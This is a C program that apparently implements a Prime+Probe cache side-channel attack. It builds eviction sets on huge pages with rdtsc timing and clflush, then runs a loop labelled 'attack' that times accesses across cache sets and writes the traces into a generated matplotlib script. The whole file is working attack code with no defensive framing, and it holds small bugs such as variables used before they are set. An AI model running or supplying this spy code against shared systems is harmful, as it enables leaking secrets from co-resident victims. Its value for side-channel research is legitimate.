#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <inttypes.h>
#define SET 2048
#define WAY 20
#define N 8*WAY*2
#define SIZE SET*N
#define THR 110
#define T 200
#define CONF -1
#define EVIC -2
#define INIT -100
#define ATTACK 600
#define FLAG 0xfffffffe0000
#define L 96
#define R 3

#define RDTSC(X) asm volatile("rdtsc; shlq $32, %%rdx; orq %%rdx, %%rax":"=r"(X) :: "%rdx")

#define LENGTH (256UL*1024*1024)
#define PROTECTION (PROT_READ | PROT_WRITE)
#ifndef MAP_HUGETLB
#define MAP_HUGETLB 0x40000
#endif
//#define ADDR ((void *)0x0UL)
#define FLAGS (MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB)

struct st{
	char name[16];
	int num;
	int count;
	int flag;
	struct st *next;
	struct st *prev;
	struct st *e_next;
	struct st *e_prev;
};

struct evi{
	int head;
	uintptr_t addr;
};


void loop();
void shuffle(int *array, int set, int n);
void insert(struct st *set, struct st *candidate);
void e_insert(struct st *set, struct st *candidate);
void myremove(struct st *candidate);
int probe(struct st *set, struct st *candidate);
int probe2(struct st *set, struct st *candidate);


int main(int argc, char **argv){
	int i, j, k, l, n, set, counter;
	int index, output_num, reader, hit;
	int lines[N], array[ATTACK];
	int test[L];
	struct st *buf;
	struct evi *evi_buf;
	
	buf = mmap(NULL, LENGTH, PROTECTION, FLAGS, -1, 0);
	evi_buf = (struct evi*)malloc(sizeof(struct st)*L);

	unsigned long long time, t1, t2;

	//loop start-----------------------------------------------------------
	set = atoi(argv[1]);
	for(;;){
		for(i = 0; i < N; i++) lines[i] = i;
		for(i = 0; i < SIZE; i++){
			buf[i].num = i;
			buf[i].count = 0;
		}

		//remove invalid cache lines------------------------------------
		for(j = 0; j < 20; j++){
			struct st *p, *conflict;	

			conflict = (struct st*)malloc(sizeof(struct st));
			conflict->num = CONF;
			conflict->next = conflict->prev = conflict;

			shuffle(lines, j, N);

			for(i = 0; i < N; i++){
				n = lines[i];
				//printf("%d ",n);
				if(!probe(conflict, &buf[n*SET + set])){
					buf[n*SET + set].count++;
					insert(conflict, &buf[n*SET + set]);
				}
			}
			for(i = 0; i < 1000; i++);
			free(conflict);
		}

		for(i = 0; i < N; i++){
			asm __volatile__(
					"clflush 0(%0)\n"
					:
					:"c"(&buf[i*SET + set])
					:
					);
		}

		//conflict set----------------------------------------------------
		struct st *conflict;
		conflict = (struct st*)malloc(sizeof(struct st));
		conflict->num = CONF;
		conflict->next = conflict->prev = conflict;

		shuffle(lines, counter, N);
		counter = 0;
		for(i = 0; i < N; i++){
			n = lines[i];
			if(buf[n*SET + set].count >= 18) continue;
			//printf("%d ",n);
			if(!probe(conflict, &buf[n*SET + set])){
				insert(conflict, &buf[n*SET + set]);
				buf[n*SET + set].flag = CONF;
				counter++;
			} else {
				buf[n*SET + set].flag = 0;
			}
		}	
		
		fprintf(stderr,"conflict set %d\n",counter);
		
		for(i = 0; i < N; i++){
			asm __volatile__(
					"mfence\n"
					"clflush 0(%0)\n"
					:
					:"c"(&buf[i*SET + set])
					:
					);
		}

		//eviction set----------------------------------------------------
		int number = 0;
		int number_check = 0;
		for(i = 0; i < N; i++){
			n = lines[i];
			if(buf[n*SET + set].count >= 18) continue;
			if(buf[n*SET + set].flag == 0){
				asm("mfence");
				if(probe(conflict, &buf[n*SET + set])){
					//printf("-------------------------------------\n");
					struct st *p, *tmp, *eviction;
					eviction = (struct st*)malloc(sizeof(struct st));
					eviction->num = EVIC;
					eviction->e_next = eviction->e_prev = eviction;

					for(p = conflict->next; p->num != CONF; p = p->next){
						p->prev->next = p->next;
						p->next->prev = p->prev;
						if(!probe2(conflict, &buf[n*SET + set])){
							e_insert(eviction, p);
						}
						p->next->prev = p;
					p->prev->next = p;

					}

					number_check++;
					for(p = eviction->e_next; p->num != EVIC; p = p->e_next){
						uintptr_t pnum = (uintptr_t)p;
						pnum &= FLAG;
						test[number++] = p->num;
					}
						
					for(p = conflict->next; p->num != CONF; p = p->next){
						if(p->flag == EVIC){
							tmp = p->next;
							myremove(p);
							p = tmp->prev;
						}
						
						asm __volatile__(
								"mfence\n"
								"lfence\n"
								"clflush 0(%0)\n"
								:
								:"c"(p)
								:
								);
					}
					free(eviction);
				}
			}
		}
		if(number_check != 8 || number != L){
			break;
		}
		fprintf(stderr,"%d : number_check %d\n",set,number_check);
	}//loop end----------------------------------------------------------------
	
	fprintf(stderr,"ok\n");

	//get other sets' eviction set-------------------------------------------
	//for(i = 0; i < N; i++){

	int s;
	uintptr_t addr,evi_seed[L];
	uintptr_t victim = 0x000000000010;
	uintptr_t viflag = 0x000000000fc0;
	victim &= viflag;
	
	for(i = 0; i < L; i++){
		evi_buf[i].head = INIT;
		addr = (uintptr_t)&buf[test[i]];
		evi_buf[i].addr = (FLAG & addr);
	}

	for(i = 0; i < 64; i++){
		addr = (uintptr_t)&buf[i];
		addr &= viflag;
		if(addr == victim){
			s = i;
			break;
		}
	}
	for(i = s; i < SIZE; i = i + 64){
		for(j = 0; j < L; j++){
			addr = (uintptr_t)&buf[i];
			addr &= FLAG;
			if(evi_buf[j].head == INIT && addr == evi_buf[j].addr){
				evi_buf[j].head = i;
				break;
			}
		}
	}
	/*
	for(i = 0; i < L; i++){
		printf("%d ,%p\n",evi_buf[i].head, &buf[evi_buf[i].head]);
	}
	*/

	printf("%d\n",buf[0 + evi_buf[(L/8)*0+l].head].num);	
	printf("%d\n",buf[SET + evi_buf[(L/8)*8+l].head].num);	
	//attack-------------------------------------------
	while(1){

		FILE *fp;

		int w;
		fprintf(stderr,"Please press any key\n");
		scanf("%d",&w);
		if(w == 0){
			exit(0);
		} else if(w == 13){
			fp = fopen("pp13.py","w");
		} else if(w == 14){
			fp = fopen("pp14.py","w");
		} else if(w == 15){
			fp = fopen("pp15.py","w");
		} else {
			fp = fopen("pp.py","w");
		}
		if(fp == NULL){
			fprintf(stderr,"file errror\n");
			exit(1);
		}

		fprintf(fp,"import matplotlib.pyplot as plt\n");
		output_num = 0;
		index = 0;

		for(i = 0; i < 8; i++){
			//printf("------------------%d---------------------\n",i);
			for(j = 0; j < SET; j = j + 64){
				for(l = 0; l < (L/8); l++){
					reader = buf[j + evi_buf[(L/8)*i+l].head].num;
				}
				for(k = 0; k < ATTACK; k++){
					loop();
					asm("lfence");
					RDTSC(t1);
					for(l = 0; l < (L/8); l++){
						reader = buf[j + evi_buf[(L/8)*i+l].head].num;
					}
					asm("lfence");
					RDTSC(t2);
					time = t2 - t1;
					array[k] = time;
				}

				hit = 0;
				for(k = 0; k < ATTACK; k++){
					//printf("%d ",array[k]);
					if(array[k] > T) hit++;
				}

				fprintf(fp,"#%d,%d",i,j);
				for(k = 0; k < ATTACK; k++){
					fprintf(fp,"%d ",array[k]);
				}
				fprintf(fp,"\n");

				if(hit > 30 && hit < 200){
					fprintf(fp,"y%d = [",output_num);
					for(k = 0; k < hit; k++){
						if(k == hit-1){
							fprintf(fp,"%d]\n",index);
						} else {
							fprintf(fp,"%d,",index);
						}
					}

					int flag = 0;
					fprintf(fp,"x%d = [",output_num);
					for(k = 0; k < ATTACK; k++){
						if(array[k] > T){
							if(flag) fprintf(fp,",");
							fprintf(fp,"%d",k);
							flag++;
						}
					}
					fprintf(fp,"]\n");

					output_num++;
				}
				index++;
			}
		}
		fprintf(stderr,"output_num %d\n",output_num);

		for(i = 0; i < output_num; i++){
			fprintf(fp,"plt.scatter(x%d, y%d, c = 'b')\n", i, i);
		}

		fprintf(fp,"plt.xlim([0,%d])\nplt.ylim([0,255])\nplt.show()\n",ATTACK);
		fclose(fp);
	}

	fprintf(stderr,"\nend\n");
	return 0;
}

void loop(){
	int i;
	for(i = 0; i < 250000; i++);
}

void shuffle(int *array, int set, int n){
	int i, j, tmp;
	srand(set);
	for(i = 0; i < n; i++){
		j = rand() % N;
		tmp = array[i];
		array[i] = array[j];
		array[j] = tmp;
	}
}


void insert(struct st *set, struct st *candidate){
	candidate->prev = set->prev;
	set->prev->next = candidate;
	candidate->next = set;
	set->prev = candidate;
}

void e_insert(struct st *set, struct st *candidate){
	candidate->flag = EVIC;
	candidate->e_prev = set->e_prev;
	set->e_prev->e_next = candidate;
	candidate->e_next = set;
	set->e_prev = candidate;
}

void myremove(struct st *candidate){
	candidate->prev->next = candidate->next;
	candidate->next->prev = candidate->prev;
	candidate->next = candidate->prev = candidate;
}

int probe(struct st *set, struct st *candidate){
	int i, j, tmp, n;
	unsigned long long time, t1, t2;
	struct st *p;

	n = 0;
	for(i = 0; i < 20; i++){
		asm("mfence");
		tmp = candidate->num;
		tmp = candidate->num;
		tmp = candidate->num;
		for(p = set->prev; p->num != CONF; p = p->prev){
			tmp = p->num;
			tmp = p->num;
			tmp = p->num;
		}
		asm("lfence");	
		RDTSC(t1);
		tmp = candidate->num;
		asm("lfence");
		RDTSC(t2);
		time = t2 - t1;
		//printf("%llu ",time);
		if(time > THR) n++;
		for(j = 0; j < 1000; j++);
	}
	//printf("%d ",n);
	return (n>=1);
}

int probe2(struct st *set, struct st *candidate){
	int i, j, tmp, n;
	unsigned long long time, t1, t2;
	struct st *p;

	n = 0;
	for(i = 0; i < 20; i++){
		asm("mfence");
		tmp = candidate->num;
		tmp = candidate->num;
		tmp = candidate->num;
		for(p = set->prev; p->num != CONF; p = p->prev){
			tmp = p->num;
			tmp = p->num;
			tmp = p->num;
		}
		asm("lfence");	
		RDTSC(t1);
		tmp = candidate->num;
		asm("lfence");
		RDTSC(t2);
		time = t2 - t1;

		if(time > THR) n++;
		for(j = 0; j < 1000; j++);
	}
	//printf("%d ",n);
	return (n>=2);
}

